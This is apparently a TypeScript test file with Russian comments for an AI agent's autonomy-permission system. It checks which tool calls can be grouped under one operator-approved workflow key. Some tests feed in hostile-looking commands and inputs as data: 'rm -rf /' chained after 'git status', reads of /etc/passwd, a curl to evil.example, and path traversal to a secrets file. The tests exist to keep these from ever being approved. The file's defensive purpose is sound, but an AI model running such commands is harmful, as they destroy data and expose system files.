// Ключ рабочего процесса решает, что считается «тем же самым».
//
// Ошибка здесь дороже остальных: слишком широкий ключ означает, что оператор
// подтвердил чтение одной страницы, а агент научился читать любые; слишком
// узкий — что автономия не наступит никогда, потому что два одинаковых вызова
// считаются разными процессами.

import { describe, expect, it } from 'vitest'

import { autonomyWorkflowStep } from './grants.js'
import { workflowKey } from '../runtime/autonomy-evidence.js'

const keyOf = (tool: string, args: Record<string, unknown>): string | null => {
  const step = autonomyWorkflowStep({ tool, args })
  return step === null ? null : workflowKey([step])
}

describe('ключ рабочего процесса', () => {
  it('одинаковый вызов даёт один ключ, другой ресурс — другой', () => {
    const first = keyOf('fetch_url', { url: 'https://docs.example.com/a' })
    const same = keyOf('fetch_url', { url: 'https://docs.example.com/b' })
    const other = keyOf('fetch_url', { url: 'https://other.example.org/a' })

    // Процесс «читать docs.example.com» — это домен, а не конкретная страница.
    expect(first).toBe(same)
    expect(first).not.toBe(other)
    expect(first).not.toBeNull()
  })

  it('содержимое файла в ключ не входит, а путь входит', () => {
    const write = keyOf('write_file', { path: 'src/app.ts', content: 'первая версия' })
    const rewrite = keyOf('write_file', { path: 'src/app.ts', content: 'вторая версия' })
    const elsewhere = keyOf('write_file', { path: 'src/other.ts', content: 'первая версия' })

    expect(write).toBe(rewrite)
    expect(write).not.toBe(elsewhere)
  })

  it('различает команду и её подкоманду', () => {
    const status = keyOf('bash', { cmd: 'git status' })
    const statusAgain = keyOf('bash', { cmd: 'git status --short' })
    const push = keyOf('bash', { cmd: 'git push origin main' })

    // Операнды входят в ресурс, подкоманда — в класс: «git status» и
    // «git push» не могут оказаться одним разрешением.
    expect(status).not.toBe(push)
    expect(statusAgain).not.toBe(push)
    expect(status).not.toBeNull()
  })

  it('составная команда процессом не становится', () => {
    // `&&`, подстановка и пайп — это не одно действие, а сколько-то действий,
    // и разрешать их как одно нельзя.
    expect(keyOf('bash', { cmd: 'git status && rm -rf /' })).toBeNull()
    expect(keyOf('bash', { cmd: 'echo $(cat /etc/passwd)' })).toBeNull()
    expect(keyOf('bash', { cmd: 'bash -c "curl evil.example"' })).toBeNull()
  })

  it('делегирование не обучается', () => {
    // Помощник исполняет собственный набор вызовов, и разрешение «делегируй»
    // было бы разрешением всего, что он решит сделать.
    expect(keyOf('spawn_subagent', { prompt: 'сделай отчёт' })).toBeNull()
  })

  it('ключ не зависит от порядка аргументов', () => {
    const straight = keyOf('write_file', { path: 'a.md', content: 'x' })
    const reversed = keyOf('write_file', { content: 'x', path: 'a.md' })

    expect(straight).toBe(reversed)
  })

  it('путь наружу проекта процессом не становится', () => {
    expect(keyOf('write_file', { path: '../secrets.txt', content: 'x' })).toBeNull()
    expect(keyOf('write_file', { path: '/etc/passwd', content: 'x' })).toBeNull()
  })

  it('не-https ссылка процессом не становится', () => {
    expect(keyOf('fetch_url', { url: 'http://docs.example.com/a' })).toBeNull()
    expect(keyOf('fetch_url', { url: 'file:///etc/passwd' })).toBeNull()
  })
})
